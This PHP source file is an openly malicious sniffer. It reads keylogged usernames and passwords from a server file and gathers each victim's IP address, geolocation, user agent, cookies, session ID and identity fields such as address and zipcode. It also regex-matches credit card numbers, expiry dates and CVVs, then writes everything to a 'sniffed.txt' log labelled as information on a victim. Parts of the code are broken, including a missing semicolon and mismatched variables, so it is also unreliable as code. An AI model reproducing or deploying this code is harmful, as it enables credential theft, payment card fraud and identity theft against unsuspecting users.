<?php
$site = $site;

# Todo get uri and merge with with content for scanning of body&links 
function clean($info){$info =json_encode($info);$info = implode(',',array_unique(explode(',', $info)))/* NO REPEATS */;$info = preg_replace('/[^A-Za-z0-9\-]/', '', $info); $info = preg_split('/(?<=[0-9])(?=[a-z]+)/i',$info);$info = implode(",",$info);$info = "[".$info." ]";$info = str_replace(",","] [",$info);return $info;}


# get password from .keylogged.inputs () --------------------------------------
$filename = $_SERVER['DOCUMENT_ROOT']."/temp.password.txt";$array = explode("\n", file_get_contents($filename));$info = implode($array);$info = explode('|',$info);if(!empty($info[0])){@$username = @$info[0];@$password = @$info[1];$data = "👤: https://".$site."|"."username:".@$username."|"."password:".@$password;}elseif(!empty(@$info[1])){@$username = @$info[1];@$password = @$info[2];$data = "👤: https://".$site."|"."username:".@$username."|"."password:".@$password;}elseif(!empty(@$info[2])){@$username = @$info[2];@$password = @$info[3];$data = "👤: https://".$site."|"."username:".@$username."|"."password:".@$password."\n";}elseif(empty($data)&&(isset($🍪))){$data = "👤: No passwords collected I stole the cookies from the cookiejar 😈";fwrite($write,$data."\n");}elseif(empty($data)&&(empty($🍪))){$site = null;$data = "👤: No information was collected on the victim";}@$agent =  $_SERVER['HTTP_USER_AGENT'];


$ipaddress = '';
if (isset($_SERVER['HTTP_CLIENT_IP'])){$ipaddress = $_SERVER['HTTP_CLIENT_IP'];} else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];} else if (isset($_SERVER['HTTP_X_FORWARDED'])){$ipaddress = $_SERVER['HTTP_X_FORWARDED'];} else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];} else if (isset($_SERVER['HTTP_FORWARDED'])) {$ipaddress = $_SERVER['HTTP_FORWARDED'];} else if (isset($_SERVER['REMOTE_ADDR'])) {$ipaddress = $_SERVER['REMOTE_ADDR'];} else {$ipaddress = null;}$ip = $ipaddress;if($ipaddress == "::1" ){$ip = null;}if($ipaddress == "127.0.0.1"){$ip = null;}if($ipaddress == "0.0.0.0"){$ip = null;}if($ipaddress == null){$ip = null;}if($ip!== null){$geo = @unserialize(@file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip));$country = $geo["geoplugin_countryName"];$city = $geo["geoplugin_city"];$location = $city;}

# gets cookie and session id info
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi',$content,  $match);$cookies = [];foreach($match[1] as $🍪) {parse_str($🍪,  $🍪);$cookies[] =  $🍪;$🍪 = json_encode($cookies);if(!empty($🍪)){echo "<!--|found a] % [ cookie 🍪 ]-->".PHP_EOL;}}
# gets identity info
preg_match_all('/^firstName\s*([^;]*)/mi',$content,  $match);$identity = [];foreach($match[1] as $👤) {parse_str($👤,  $👤);$identity[] =  $👤;$👤 = json_encode($identity);}
# gets identity info
preg_match_all('/^firstName\s*([^;]*)/mi',$content,  $match);$identity = [];foreach($match[1] as $👤) {parse_str($👤,  $👤);$identity[] =  $👤;$👤 = json_encode($identity);}
# gets identity info
preg_match_all('/^address\s*([^;]*)/mi',$content,  $match);$identity = [];foreach($match[1] as $👤) {parse_str($👤,  $👤);$identity[] =  $👤;$👤 = json_encode($identity);}
# gets identity info
preg_match_all('/^zipcode\s*([^;]*)/mi',$content,  $match);$identity = [];foreach($match[1] as $👤) {parse_str($👤,  $👤);$identity[] =  $👤;$👤 = json_encode($identity);}
# gets identity info
preg_match_all('/^state\s*([^;]*)/mi',$content,  $match);$identity = [];foreach($match[1] as $👤) {parse_str($👤,  $👤);$identity[] = $👤;$👤 = json_encode($identity);}
if(empty($👤)){
$👤 = "No Identity information was gathered";
}
clean($👤);
# sniff Visa
preg_match_all("/(^4[0-9]{12}(?:[0-9]{3})?$).*/",$content,$matches);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
#sniff Master Card
preg_match_all("/^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/",$content,$matches);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
#sniff American Express 
preg_match_all("/^3[47][0-9]{13}$/",$content,$matches);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
preg_match_all('/^card-number\s*([^;]*)/mi',$content,  $match);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
# gets credit cards exp
preg_match_all('/^exp\s*([^;]*)/mi',$content,  $match);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
# gets credit security code
preg_match_all('/^security-code\s*([^;]*)/mi',$content,  $match);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
# gets credit cards cvv
preg_match_all('/^cvv\s*([^;]*)/mi',$content,  $match);$cards = [];foreach($match[1] as $💳) {parse_str($💳,  $💳);$cards[] =  $💳;$💳 = json_encode($cards);}
if(empty($💳)){
$💳 = "No Payment information was gathered";
}
clean($💳);
if($ip == null){$ip = getenv('REMOTE_ADDR');}if($ip==null){$ip = "localhost";$state = null;$city = "HOME";}
$write = fopen($_SERVER['DOCUMENT_ROOT'].'/sniffed.txt', 'w++');
fwrite($write,"<!-- Malicious collected information on a victim on ".$date." --> "."\n"."\n");
$💰 = @$💳;fwrite($write, ("👤: ".$👤."\n"));fwrite($write, ($data."\n"));fwrite($write, ("💻: ".$agent."\n"));fwrite($write, ("🍪: ".(@$🍪)."\n"));fwrite($write, ("🌐: ".$ip."\n"));fwrite($write, ("🌐: ".$city."\n"))fwrite($write, ("💰: ".@$💰."\n"));fwrite($write, (PHP_EOL));fwrite($write, $PHPSESSID);fwrite($write, PHP_EOL.PHP_EOL);fclose($write);?>



